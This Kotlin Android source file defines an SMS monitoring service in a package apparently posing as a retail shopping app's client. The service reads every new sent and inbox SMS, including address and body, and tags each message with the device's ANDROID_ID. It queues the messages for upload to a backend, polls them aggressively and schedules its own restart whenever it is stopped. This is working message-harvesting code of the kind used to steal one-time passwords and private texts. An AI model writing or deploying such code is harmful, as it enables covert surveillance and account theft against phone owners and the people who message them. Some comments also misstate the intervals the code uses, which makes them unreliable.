package com.dmartuser.client

import android.app.*
import android.content.ContentResolver
import android.content.Intent
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SmsMonitoringService : Service() {
    private val CHANNEL_ID = "sms_monitoring_channel"
    private val NOTIFICATION_ID = 1001
    private var enableSentSmsSync = false
    private lateinit var smsObserver: SmsContentObserver
    private lateinit var sentSmsObserver: SmsContentObserver
    private var lastSentSmsId = -1L
    private var lastInboxSmsId = -1L
    private val smsCheckHandler = Handler(Looper.getMainLooper())
    private val sentSmsCheckRunnable = object : Runnable {
        override fun run() {
            checkForNewSentMessages()
            smsCheckHandler.postDelayed(this, 10000) // Check every 1 second for real-time
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        
        // Initialize SMS content observers
        initializeSmsObservers()
        
        // Start aggressive SMS checking
        startAggressiveSmsCheck()
        
        schedulePeriodicWork()
        Log.d("SmsMonitoringService", "Service created with real-time monitoring")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("SmsMonitoringService", "Service start command received")
        
        // Restart observers
        initializeSmsObservers()
        startAggressiveSmsCheck()
        schedulePeriodicWork()
        
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        
        // Stop all handlers
        smsCheckHandler.removeCallbacks(sentSmsCheckRunnable)
        
        // Unregister observers
        try {
            if (::smsObserver.isInitialized) {
                contentResolver.unregisterContentObserver(smsObserver)
            }
            if (::sentSmsObserver.isInitialized) {
                contentResolver.unregisterContentObserver(sentSmsObserver)
            }
        } catch (e: Exception) {
            Log.e("SmsMonitoringService", "Error unregistering observers: ${e.message}")
        }
        
        Log.d("SmsMonitoringService", "Service destroyed")
        scheduleServiceRestart()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun initializeSmsObservers() {
        try {
            // Unregister existing observers
            if (::smsObserver.isInitialized) {
                contentResolver.unregisterContentObserver(smsObserver)
            }
            if (::sentSmsObserver.isInitialized) {
                contentResolver.unregisterContentObserver(sentSmsObserver)
            }
            
            // Create new observers
            smsObserver = SmsContentObserver(Handler(Looper.getMainLooper()))
            sentSmsObserver = SmsContentObserver(Handler(Looper.getMainLooper()))
            
            // Register for all SMS changes with high priority
            contentResolver.registerContentObserver(
                Uri.parse("content://sms"),
                true,
                smsObserver
            )
            
            // Register specifically for sent SMS
            contentResolver.registerContentObserver(
                Uri.parse("content://sms/sent"),
                true,
                sentSmsObserver
            )
            
            // Initialize last SMS IDs
            initializeLastSmsIds()
            
            Log.d("SmsMonitoringService", "SMS observers initialized")
            
        } catch (e: Exception) {
            Log.e("SmsMonitoringService", "Error initializing SMS observers: ${e.message}")
        }
    }

    private fun initializeLastSmsIds() {
        try {
            // Get latest sent SMS ID
            val sentCursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/sent"),
                arrayOf("_id"),
                null,
                null,
                "_id DESC LIMIT 1"
            )
            
            sentCursor?.use {
                if (it.moveToFirst()) {
                    lastSentSmsId = it.getLong(it.getColumnIndexOrThrow("_id"))
                    Log.d("SmsMonitoringService", "Latest sent SMS ID: $lastSentSmsId")
                }
            }
            
            // Get latest inbox SMS ID
            val inboxCursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id"),
                null,
                null,
                "_id DESC LIMIT 1"
            )
            
            inboxCursor?.use {
                if (it.moveToFirst()) {
                    lastInboxSmsId = it.getLong(it.getColumnIndexOrThrow("_id"))
                    Log.d("SmsMonitoringService", "Latest inbox SMS ID: $lastInboxSmsId")
                }
            }
            
        } catch (e: Exception) {
            Log.e("SmsMonitoringService", "Error initializing SMS IDs: ${e.message}")
        }
    }

    private fun startAggressiveSmsCheck() {
        smsCheckHandler.removeCallbacks(sentSmsCheckRunnable)
        smsCheckHandler.post(sentSmsCheckRunnable)
        Log.d("SmsMonitoringService", "Started aggressive SMS checking")
    }

    private inner class SmsContentObserver(handler: Handler) : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            Log.d("SmsContentObserver", "SMS content changed immediately: $uri")
            
            // Immediate check without delay for real-time response
            smsCheckHandler.post {
                checkForNewSentMessages()
                checkForNewInboxMessages()
            }
        }
        
        override fun onChange(selfChange: Boolean) {
            super.onChange(selfChange)
            Log.d("SmsContentObserver", "SMS content changed (no URI)")
            
            // Immediate check
            smsCheckHandler.post {
                checkForNewSentMessages()
                checkForNewInboxMessages()
            }
        }
    }

    private fun checkForNewSentMessages() {
    // ✅ ADD THIS CHECK AT THE TOP
    if (!enableSentSmsSync) {
        Log.d("SmsMonitoringService", "⚠️ Sent SMS sync DISABLED - preventing duplicates")
        return  // Exit the method without processing
    }


        try {
            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/sent"),
                arrayOf("_id", "address", "body", "date"),
                "_id > ?",
                arrayOf(lastSentSmsId.toString()),
                "_id ASC"
            )

            cursor?.use {
                val smsArray = JSONArray()
                var newMaxId = lastSentSmsId
                
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow("_id"))
                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))

                    if (address.isEmpty() || body.isEmpty()) continue

                    val smsObject = JSONObject()
                    smsObject.put("address", address)
                    smsObject.put("body", body)
                    smsObject.put("date", date)
                    smsObject.put("type", "sent")
                    smsArray.put(smsObject)

                    newMaxId = maxOf(newMaxId, id)
                    Log.d("SmsMonitoringService", "REAL-TIME SENT SMS: to=$address, body=$body, id=$id")
                }

                if (smsArray.length() > 0) {
                    lastSentSmsId = newMaxId
                    Log.d("SmsMonitoringService", "Sending ${smsArray.length()} sent messages to backend immediately")
                    enqueueSmsWorkerImmediate(smsArray)
                }
            }
        } catch (e: Exception) {
            Log.e("SmsMonitoringService", "Error checking sent messages: ${e.message}")
        }
    }

    private fun checkForNewInboxMessages() {
        try {
            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id", "address", "body", "date"),
                "_id > ?",
                arrayOf(lastInboxSmsId.toString()),
                "_id ASC"
            )

            cursor?.use {
                val smsArray = JSONArray()
                var newMaxId = lastInboxSmsId
                
                while (it.moveToNext()) {
                    val id = it.getLong(it.getColumnIndexOrThrow("_id"))
                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))

                    if (address.isEmpty() || body.isEmpty()) continue

                    val smsObject = JSONObject()
                    smsObject.put("address", address)
                    smsObject.put("body", body)
                    smsObject.put("date", date)
                    smsObject.put("type", "inbox")
                    smsArray.put(smsObject)

                    newMaxId = maxOf(newMaxId, id)
                    Log.d("SmsMonitoringService", "REAL-TIME INBOX SMS: from=$address, body=$body, id=$id")
                }

                if (smsArray.length() > 0) {
                    lastInboxSmsId = newMaxId
                    Log.d("SmsMonitoringService", "Sending ${smsArray.length()} inbox messages to backend immediately")
                    enqueueSmsWorkerImmediate(smsArray)
                }
            }
        } catch (e: Exception) {
            Log.e("SmsMonitoringService", "Error checking inbox messages: ${e.message}")
        }
    }

    private fun enqueueSmsWorkerImmediate(smsArray: JSONArray) {
        val deviceId = getCustomDeviceId()
        
        val input = Data.Builder()
            .putString("sms_data", smsArray.toString())
            .putString("device_id", deviceId)
            .putBoolean("is_realtime", true)
            .build()

        // Use expedited work for immediate processing
        val work = OneTimeWorkRequestBuilder<SmsWorker>()
            .setInputData(input)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
            .build()

        WorkManager.getInstance(this).enqueue(work)
        Log.d("SmsMonitoringService", "Immediate SMS worker enqueued for device: $deviceId")
    }

    private fun getCustomDeviceId(): String {
        return try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_android_id"
        } catch (e: Exception) {
            "unknown_android_id"
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SMS Real-time Monitor",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Real-time SMS monitoring service"
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SMS Monitor (Real-time)")
            .setContentText("Monitoring SMS in real-time")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun schedulePeriodicWork() {
        // Reduced to 5 minutes for more frequent sync
        val periodicWork = PeriodicWorkRequestBuilder<SmsMonitoringWorker>(15, TimeUnit.MINUTES)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "sms_monitoring_work",
            ExistingPeriodicWorkPolicy.KEEP,
            periodicWork
        )
    }

    private fun scheduleServiceRestart() {
        val restartWork = OneTimeWorkRequestBuilder<ServiceRestartWorker>()
            .setInitialDelay(2, TimeUnit.SECONDS) // Faster restart
            .build()

        WorkManager.getInstance(this).enqueue(restartWork)
    }
}
